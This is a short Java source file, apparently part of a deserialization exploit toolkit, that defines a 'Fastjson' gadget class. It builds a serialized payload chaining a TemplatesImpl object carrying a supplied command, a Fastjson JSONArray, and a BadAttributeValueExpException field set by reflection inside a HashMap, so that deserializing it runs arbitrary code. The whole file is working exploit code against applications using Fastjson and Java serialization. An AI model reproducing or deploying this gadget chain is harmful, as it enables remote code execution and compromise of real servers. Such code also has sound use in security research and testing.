package org.gadget;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.gadget.inter.Gadget;
import org.util.TemplateUtils;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Fastjson implements Gadget {
    public Object getObject(String common,String path) throws Exception {
        TemplatesImpl template = TemplateUtils.getTemplate(common,path);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        Field field = bd.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(bd, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, bd);

        return hashMap;
    }
}
